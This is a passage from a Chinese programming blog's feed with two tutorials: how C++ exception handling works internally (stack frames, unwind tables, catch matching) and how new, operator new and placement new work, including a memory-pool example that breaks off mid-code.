        <content type="html"><![CDATA[<h1 id="C函数的调用和返回"><a href="#C函数的调用和返回" class="headerlink" title="C函数的调用和返回"></a>C函数的调用和返回</h1><p>要理解 C++ 异常机制实现之前，首先要了解一个函数的调用和返回机制，这里面就要涉及到 ESP 和 EBP 寄存器。这两个寄存器是用来维护一个函数栈帧的关键寄存器，我们先看一下函数调用和返回的流程。</p><p>下面是按函数调用约定 <strong>__stdcall</strong> 调用函数 test(int p1,int p2) 的汇编代码，假设执行函数前堆栈指针 ESP 为 NN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">push p2 ;参数2入栈, ESP -= 4h , ESP = NN - 4h</span><br><span class="line">push p1 ;参数1入栈, ESP -= 4h , ESP = NN - 8h</span><br><span class="line">call test ;压入返回地址 ESP -= 4h, ESP = NN - 0Ch</span><br><span class="line">&#123;</span><br><span class="line">push ebp;保护先前EBP指针， EBP入栈， ESP-=4h, ESP = NN - 10h</span><br><span class="line">mov ebp, esp ;设置EBP指针指向栈顶 NN-10h</span><br><span class="line">mov eax, dword ptr [ebp+0ch] ;ebp+0ch为NN-4h,即参数2的位置</span><br><span class="line">mov ebx, dword ptr [ebp+08h] ;ebp+08h为NN-8h,即参数1的位置</span><br><span class="line">sub esp, 8;局部变量所占空间ESP-=8, ESP = NN-18h</span><br><span class="line">...</span><br><span class="line">add esp, 8 ;释放局部变量, ESP+=8, ESP = NN-10h</span><br><span class="line">pop ebp ;出栈,恢复EBP, ESP+=4, ESP = NN-0Ch</span><br><span class="line">ret 8 ;ret返回,弹出返回地址,ESP+=4, ESP=NN-08h, 后面加操作数8为平衡堆栈,ESP+=8,ESP=NN, 恢复进入函数前的堆栈.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数栈架构主要承载着以下几个部分：</p><ul><li>1、传递参数：通常，函数的调用参数总是在这个函数栈框架的最顶端。</li><li>2、传递返回地址：告诉被调用者的 return 语句应该 return 到哪里去，通常指向该函数调用的下一条语句（代码段中的偏移）。</li><li>3、存放调用者的当前栈指针：便于清理被调用者的所有局部变量、并恢复调用者的现场。</li><li>4、存放当前函数内的所有局部变量：所有局部和临时变量都是存储在栈上的。</li></ul><p><img src="1.png"></p><hr><h1 id="C-函数调用"><a href="#C-函数调用" class="headerlink" title="C++函数调用"></a>C++函数调用</h1><p>首先澄清一点，这里说的 “C++ 函数”是指：</p><ul><li>1、该函数可能会直接或间接地抛出一个异常：即该函数的定义存放在一个 C++ 编译（而不是传统 C）单元内，并且该函数没有使用 “throw()” 异常过滤器。</li><li>2、该函数的定义内使用了 try 块。</li></ul><p>以上两者满足其一即可。为了能够成功地捕获异常和正确地完成栈回退（stack unwind），编译器必须要引入一些额外的数据结构和相应的处理机制。我们首先来看看引入了异常处理机制的栈框架大概是什么样子：<br><img src="2.png"><br>由上图可见，在每个 C++ 函数的栈框架中都多了一些东西。仔细观察的话，你会发现，多出来的东西正好是一个 <strong>EXP 类型的结构体</strong>。进一步分析就会发现，这是一个典型的单向链表式结构：</p><ul><li>piPrev 成员指向链表的上一个节点，它主要用于在函数调用栈中逐级向上寻找匹配的 catch 块，并完成栈回退工作。</li><li>piHandler 成员指向完成异常捕获和栈回退所必须的数据结构（主要是两张记载着关键数据的表：<strong>“try”块表</strong>：tblTryBlocks 及“<strong>栈回退表</strong>”：tblUnwind）。</li><li>nStep 成员用来定位 try 块，以及在栈回退表中寻找正确的入口。</li></ul><p><strong>需要说明的是</strong>：编译器会为每一个 “C++ 函数”定义一个 EHDL 结构，不过只会为包含了 “try” 块的函数定义 tblTryBlocks 成员。此外，异常处理器还会为每个线程维护一个指向当前异常处理框架的指针。该指针指向异常处理器链表的链尾，通常存放在某个 TLS 槽或能起到类似作用的地方。</p><hr><h1 id="栈回退（stack-unwind）"><a href="#栈回退（stack-unwind）" class="headerlink" title="栈回退（stack unwind）"></a>栈回退（stack unwind）</h1><p>“栈回退”是伴随异常处理机制引入 C++ 中的一个新概念，主要用来确保在异常被抛出、捕获并处理后，所有生命期已结束的对象都会被正确地析构，它们所占用的空间会被正确地回收。下面我们就来具体看看编译器是如何实现栈回退机制的：<br><img src="3.png"></p><p>图中的 “FuncUnWind” 函数内，所有真实代码均以黑色和蓝色字体标示，编译器生成的代码则由灰色和橙色字体标明。此时，在图里给出的 nStep 变量和 tblUnwind 成员作用就十分明显了。</p><p><strong>nStep 变量用于跟踪函数内局部对象的构造、析构阶段。再配合编译器为每个函数生成的 tblUnwind 表，就可以完成退栈机制。</strong> 表中的 pfnDestroyer 字段记录了对应阶段应当执行的析构操作（析构函数指针）；pObj 字段则记录了与之相对应的对象 this 指针偏移。将 pObj 所指的偏移值加上当前栈框架基址（EBP），就是要代入 pfnDestroyer 所指析构函数的 this 指针，这样即可完成对该对象的析构工作。而 nNextIdx 字段则指向下一个需要析构对象所在的行（下标）。</p><p>在发生异常时，异常处理器首先检查当前函数栈框架内的 nStep 值，并通过 piHandler 取得 tblUnwind[] 表。然后将 nStep 作为下标带入表中，执行该行定义的析构操作，然后转向由 nNextIdx 指向的下一行，直到 nNextIdx 为 -1 为止。在当前函数的栈回退工作结束后，异常处理器可沿当前函数栈框架内 piPrev 的值回溯到异常处理链中的上一节点重复上述操作，直到所有回退工作完成为止。</p><p>值得一提的是，<strong>nStep 的值完全在编译时决定</strong>，运行时仅需执行若干次简单的整形立即数赋值（通常是直接赋值给CPU里的某个寄存器）。此外，对于所有内部类型以及使用了默认构造、析构方法（并且它的所有成员和基类也使用了默认方法）的类型，其创建和销毁均不影响 nStep 的值。</p><blockquote><p>[注意]：如果在栈回退的过程中，由于析构函数的调用而再次引发了异常（异常中的异常），则被认为是一次异常处理机制的严重失败。此时进程将被强行禁止。为防止出现这种情况，应在所有可能抛出异常的析构函数中使用 <code>std::uncaught_exception()</code> 方法判断当前是否正在进行栈回退（即：存在一个未捕获或未完全处理完毕的异常）。如是，则应抑制异常的再次抛出。</p></blockquote><hr><h1 id="异常捕获"><a href="#异常捕获" class="headerlink" title="异常捕获"></a>异常捕获</h1><p>一个异常被抛出时，就会立即引发 C++ 的异常捕获机制：<br><img src="4.png"></p><p>在上一小节中，我们已经看到了 nStep 变量在跟踪对象构造、析构方面的作用。实际上 nStep 除了能够跟踪对象创建、销毁阶段以外，还能够标识当前执行点是否在 try 块中，以及（如果当前函数有多个 try 块的话）究竟在哪个 try 块中。这是通过在每一个 try 块的入口和出口各为 nStep 赋予一个唯一 ID 值，并确保 nStep 在对应 try 块内的变化恰在此范围之内来实现的。</p><p>在具体实现异常捕获时，首先，C++ 异常处理器检查发生异常的位置是否在当前函数的某个 try 块之内。这项工作可以通过将当前函数的 nStep 值依次在 piHandler 指向 tblTryBlocks[] 表的条目中进行范围为 [nBeginStep, nEndStep) 的比对来完成。</p><p>例如：上图中的 FuncB 在 nStep == 2 时发生了异常，则通过比对 FuncB 的 tblTryBlocks[] 表发现 2∈[1, 3)，故该异常发生在 FuncB 内的第一个 try 块中。其次，如果异常发生的位置在当前函数中的某个 try 块内，则尝试匹配该 tblTryBlocks[] 相应条目中的 tblCatchBlocks[] 表。tblCatchBlocks[] 表中记录了与指定 try 块配套出现的所有 catch 块相关信息，包括这个 catch 块所能捕获的异常类型及其起始地址等信息。若找到了一个匹配的 catch 块，则复制当前异常对象到此 catch 块，然后跳转到其入口地址执行块内代码。否则，则说明异常发生位置不在当前函数的 try 块内，或者这个 try 块中没有与当前异常相匹配的 catch 块，此时则沿着函数栈框架中 piPrev 所指地址（即：异常处理链中的上一个节点）逐级重复以上过程，直至找到一个匹配的 catch 块或到达异常处理链的首节点。对于后者，我们称为发生了<strong>未捕获的异常</strong>，对于 C++ 异常处理器而言，未捕获的异常是一个严重错误，将导致当前进程被强制结束。</p><hr><h1 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h1><p>接下来讨论整个 C++ 异常处理机制中的最后一个环节，异常的抛出：<br><img src="5.png"></p><p>在编译一段 C++ 代码时，编译器会将所有 throw 语句替换为其 C++ 运行时库中的某一指定函数，这里我们叫它 <strong>__CxxRTThrowExp</strong>（与本文提到的所有其它数据结构和属性名一样，在实际应用中它可以是任意名称）。该函数接收一个编译器认可的内部结构（我们叫它 EXCEPTION 结构）。这个结构中包含了待抛出异常对象的起始地址、用于销毁它的析构函数，以及它的 type_info 信息。对于没有启用 RTTI 机制（编译器禁用了 RTTI 机制或没有在类层次结构中使用虚表）的异常类层次结构，可能还要包含其所有基类的 type_info 信息，以便与相应的 catch 块进行匹配。</p><p>在图中的深灰色框图内，我们使用 C++ 伪代码展示了函数 FuncA 中的 “throw myExp(1);” 语句将被编译器最终翻译成的样子。实际上在多数情况下，__CxxRTThrowExp 函数即我们前面曾多次提到的“异常处理器”，异常捕获和栈回退等各项重要工作都由它来完成。__CxxRTThrowExp 首先接收（并保存）EXCEPTION 对象；然后从 TLS：Current ExpHdl 处找到与当前函数对应的 piHandler、nStep 等异常处理相关数据；并按照前文所述的机制完成异常捕获和栈回退。由此完成了包括“抛出”-&gt;“捕获”-&gt;“回退”等步骤的整套异常处理机制。</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>程序在抛出异常后，则通过当前的 ExpHdl 获得 piHandle，该结构体中记录着栈回退表和 try 语句块的信息，首先去 try 语句块中寻找匹配的 catch 语句块，如果没有找到则进行进行栈回退到上一层的函数，重复这个过程直到找到匹配的 catch 语句块，如果一直到达异常处理链的顶点都没有找到，则强制结束进程。当然也有可能在当前的栈帧中就没有 try 语句块，那就直接进行栈回退去匹配 catch 语句块。</p><blockquote><p>转自 <a href="https://www.jb51.net/article/141382.htm">https://www.jb51.net/article/141382.htm</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 底层技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 内存管理 ------ new 操作符、operator new 函数、placement new 函数</title>
      <link href="/2021/10/27/cpp-memory-manage/"/>
      <url>/2021/10/27/cpp-memory-manage/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 C 语言中，我们使用的最多的与内存分配释放相关的函数是 malloc 和 free。而在 C++ 中，我们通常不直接使用 malloc 和 free 函数来操作内存，而是通过 C++ 中内置的操作符 new 和 delete 来进行内存的分配和释放。但是，你真的理解 new 和 delete 背后的实现原理吗？你又是否经常听到 new operator 和 operator new 这样的词，但是无法理清思绪而分不清其区别呢？接下来这篇文章就详细的讲解 C++ 内存管理中常用到的几个 primitive 级别的概念：new 操作符、operator new 函数、placement new 函数。</p><hr><h1 id="new-operator-的工作机理"><a href="#new-operator-的工作机理" class="headerlink" title="new operator 的工作机理"></a>new operator 的工作机理</h1><p>所谓 new operator ，翻译成中文就是 new 操作符，操作符在 C++ 中以关键字形式实现的一种语法特性，所以，new 和 delete 只不过是 C++ 中的关键字罢了。C++ 是如何处理这些关键字的呢？在我们 new 一个对象的时候，编译器是如何帮我们处理的呢？delete 操作符呢？在这里，我们先说出结论：</p><p><strong>new 一个对象。</strong>这里一般是包括三个步骤：</p><ul><li>首先，调用 operator new 函数（没错，就是 operator new 函数，暂时只需要将其理解为一个特殊名字的普通函数就行）分配一个类对象大小的内存，然后返回该内存的指针，指针类型是 void * 。</li><li>然后，将返回的指针转换成类类型。</li><li>最后，通过类类型的指针在分配的内存上调用指定的类构造函数，初始化对象，并返回指向该对象的指针。</li></ul><p><strong>delete 一个对象。</strong>这里一般是包括三个步骤：</p><ul><li>首先，通过指向该对象的指针调用对象的析构函数。</li><li>然后，将指向该对象的指针转换成 void * 类型。</li><li>最后，调用 operator delete 函数来释放由 operator new 分配的空间。</li></ul><p>我们可以通过以下示例来演示上述的过程。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="built_in">A</span>():<span class="built_in">a</span>(<span class="number">1</span>)&#123;&#125;</span><br><span class="line">~<span class="built_in">A</span>()&#123; a = <span class="number">2</span>;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A *a = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">delete</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过 clang 编译器将这两行代码转变为 llvm IR，观察其具体的过程：</p><p><img src="1.png"></p><p>可以很显然的看出，在 IR 层次，对 new 操作符和 delete 操作符都如上述所描述三个步骤一致。</p><blockquote><p>我们还可以使用 new 动态分配 const 对象，如下：<br><code>const int *p = new const int(1024);</code><br>这种方式就会分配并初始化一个 const int，类似于其他的任何 const 对象，一个动态分配的 const 对象也必须进行初始化。</p></blockquote><hr><h1 id="operator-new-函数的重载"><a href="#operator-new-函数的重载" class="headerlink" title="operator new 函数的重载"></a>operator new 函数的重载</h1><p>在上述对 new 操作的讨论中，我们知道了实际上在 new‘ 一个对象时其实是有三个步骤的，而其中第一个步骤就是调用 operator new 函数来向操作系统申请分配内存的，我们发现并没有在任何地方看到这个函数的声明和定义，那为什么可以直接用呢？其实这个函数是标准库为我们添加的，已经内置在标准库的实现当中。既然 operator new 是一个函数，那肯定可以重载了，确实，C++ 在内存管理这块，给用户提供了很大的便利，因为申请的内存的动作是被包装在 operator new 函数中，所以只需要重载 operator new 函数，我们用户就可以实现自己的内存管理。</p><p>注意，<strong>用户可以自定义全局的 operator new 和 operator delete 函数，也可以将它们定义为某个类的成员函数。</strong>在实际使用中，我们是很少自定义全局的 operator new 函数的，即使这个行为是被允许的，因为一旦重载了全局的 operator new 函数，应用程序的内存分配任务都会受到影响，这并不是我们期望看到的。</p><p>当编译器发现一条 new 表达式或 delete 表达式后，将在程序中查找可供调用的 operator 函数。如果被分配（释放）的对象是类类型的，则编译器首先在类及其基类的作用域中查找。也就说，编译器会优先使用用户定义在类中的 operator new 和 operator delete 的重载，其次是用户定义的全局的重载，如果都没有找到，再使用标准库定义的版本。</p><p>下面的代码简单的使用我们对于 operator new 函数的重载：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">A</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;A ctor!\n&quot;</span>; &#125;</span><br><span class="line">~<span class="built_in">A</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;A dtor!\n&quot;</span>; &#125;</span><br><span class="line"><span class="comment">// 重载类 A 中的 operator new 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="keyword">operator</span> <span class="title">new</span> <span class="params">(<span class="keyword">size_t</span> s)</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;A::operator new!\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">malloc</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 重载类 A 中的 operator delete 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span> <span class="params">(<span class="keyword">void</span> *p)</span> </span>&#123;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;A::operator delete!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">A *p = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************** output ***********************</span></span><br><span class="line"><span class="comment">A::operator new!</span></span><br><span class="line"><span class="comment">A ctor!</span></span><br><span class="line"><span class="comment">A dtor!</span></span><br><span class="line"><span class="comment">A::operator delete!</span></span><br><span class="line"><span class="comment">*******************************************************/</span></span><br></pre></td></tr></table></figure><p>可见在 main 函数中 new 一个 A 的对象的时候，调用了 A 中重载的 operator new 和 operator delete 函数。</p><p>编译器已经为我们定义了 operator new 和 operator delete 的 4 个重载版本：<br><code>void * operator new (size_t);</code><br><code>void * operator new[] (size_t);</code><br><code>void operator delete (void *) noexcept;</code><br><code>void operator delete[] (void *) noexcept;</code></p><p>如果在代码中使用了这四个中的任意一个，则可以通过 clang 导出语法树查看到这四个函数的声明：</p><p><img src="2.png"></p><p>对于这四个函数及其重载，有如下需要注意的点：</p><ul><li>类似于析构函数，operator delete 函数也不允许抛出异常。所以在重载的时候，必须使用 noexcept 异常说明符指定其不抛出异常。</li><li>重载的 operator new 和 operator delete 函数必须位于<strong>全局作用域</strong>和<strong>类作用域</strong>中。</li><li>将上述函数定义为类的成员时，它们是<strong>隐式静态的</strong>，因为 operator new 在对象构造之前调用，而 operator delete 在对象析构之后调用。</li><li>对于 operator new 和 operator new[] 来说，其返回类型必须是 void * ，第一个参数必须是 size_t ，且该形参不能含有默认实参。也就说是它们还可以指定额外的形参，此时 new 操作符必须使用<strong>定位 new</strong> 形式，也就是 placement new 形式，这个我们在后续讲解。</li><li>对于 operator delete 和 operator delete[] 来说，其返回类型必须是 void，第一个形参类型必须是 void * 。</li></ul><hr><h1 id="placement-new-表达式"><a href="#placement-new-表达式" class="headerlink" title="placement new 表达式"></a>placement new 表达式</h1><p>如果应用程序直接调用 operator new 函数，则仅仅进行了内存分配，但是没有调用类的构造函数来初始化对象，那么我们可以显式的调用构造函数进行初始化，实际上在很多编译器上这是不被允许的，那我们应该怎么调用类的构造函数初始化对象呢？这时候，placement new 表达式就派上用场了！placement new 的用法如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;new&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">A</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;A ctor!\n&quot;</span>; &#125;</span><br><span class="line">~<span class="built_in">A</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;A dtor!\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p = <span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="built_in"><span class="keyword">sizeof</span></span>(A));<span class="comment">// 调用全局的 operator new 申请空间</span></span><br><span class="line">A *pA = <span class="built_in"><span class="keyword">new</span></span>(p) A;<span class="comment">// placement new 操作符</span></span><br><span class="line"><span class="keyword">delete</span> pA;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你一定很好奇，placement new 是怎么实现的，其实这也很简单。正如之前所述，operator new 函数是可以重载的，但是有一种形式是不能被用户重载的：<br><code>void * operator new(size_t, void *)</code></p><p>这是因为在标准库已经为我们实现了这个重载，其函数实现也非常简单，就是仅仅返回传入的指针，这样就相当于完成了 new 操作符的第一步。这里我们截图了其在标准库中的实现：</p><p><img src="3.png"></p><p>其实我们发现所谓的 placement new 也不过是 operator new 函数重载的一种形式，除了直接调用它，还可以通过定位 new 操作符的方式来间接调用它。由于在其实现中仅仅返回传入的指针，所以相当于对传入的指针调用所指定的类的构造函数。<strong>其实我们可以看出这个是十分危险的动作，因为我们可以传入任意的指针，然后在其指向的空间上通过类构造函数进行内存改写</strong>！</p><blockquote><p>既然有特殊的方式来简介的调用类的构造函数对内存进行初始化，那么有没有什么办法调用类的析构函数呢？其实类的析构函数可以直接调用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A *p = <span class="keyword">new</span> A;</span><br><span class="line">p-&gt;~<span class="built_in">A</span>();<span class="comment">// 直接调用 A 的析构函数</span></span><br></pre></td></tr></table></figure><p>但注意这样是不安全的，因为仅仅调用了 A 的析构函数，但是没有释放 p 指向的内存空间。</p></blockquote><hr><h1 id="示例：为类写一个内存池"><a href="#示例：为类写一个内存池" class="headerlink" title="示例：为类写一个内存池"></a>示例：为类写一个内存池</h1><p>讲了这么多 primitive 的用法和原理，那到底他们有什么用呢？我们通过为我们的类实现一个小的内存池来实现理解其作用，我们知道每一次向操作系统分配空间的时候，除了需要调用 malloc 函数带来的时间开销，最重要的还有一个称为 cookie 的额外空间开销。假如我们的类很小，又需要多次的申请空间的操作，这样每次申请空间都会有额外的 cookie 开销，多次的申请带来的额外空间开销占比可能是非常大的。那么我们可不可以一次性多申请空间呢，用的时候直接拿呢？这样是不是就可以避免多次申请带来的 cookie 开销呢？下面就是一个实例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Screen</span>(<span class="keyword">int</span> _x, <span class="keyword">int</span> _y, <span class="keyword">int</span> _z) : <span class="built_in">rep</span>(&#123;_x, _y, _z&#125;) &#123; std::cout &lt;&lt; <span class="string">&quot;Screen&#x27;s Ctor!!!\n&quot;</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">Screen</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Screen&#x27;s Dtor!!!\n&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getLength</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> rep.length; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getWidth</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> rep.width; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getheight</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> rep.height; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> *<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *, <span class="keyword">size_t</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 内存池空闲块链表的头指针</span></span><br><span class="line">    <span class="keyword">static</span> Screen *freeStore;</span><br><span class="line">    <span class="comment">// 内存池的总大小，以类的大小为单位</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> screenChunk;</span><br><span class="line">    <span class="comment">// 当前已经从内存池中分配出去的空间</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> isBusy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ScreenRep</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">int</span> length;</span><br><span class="line">        <span class="keyword">int</span> width;</span><br><span class="line">        <span class="keyword">int</span> height;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 采用 union 的方式来减少对象所占用的内存</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ScreenRep rep;</span><br><span class="line">        Screen *next;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Screen *Screen::freeStore = <span 